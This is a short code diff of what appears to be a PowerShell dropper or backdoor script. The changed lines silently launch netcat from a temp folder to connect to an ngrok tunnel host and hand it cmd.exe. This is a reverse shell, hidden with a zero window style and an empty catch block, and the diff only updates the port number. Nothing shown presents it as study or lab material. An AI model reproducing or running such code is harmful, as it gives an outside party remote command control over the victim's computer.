@@ -19,7 +19,7 @@ try {
 
 try {
     $WshShell = New-Object -ComObject WScript.Shell
-    $WshShell.Run("C:\TempVBS\nc.exe 0.tcp.in.ngrok.io 12899 -e cmd.exe", 0, $false)
+    $WshShell.Run("C:\TempVBS\nc.exe 0.tcp.in.ngrok.io 10040 -e cmd.exe", 0, $false)
 } catch {}
 
 Start-Sleep -Seconds 1
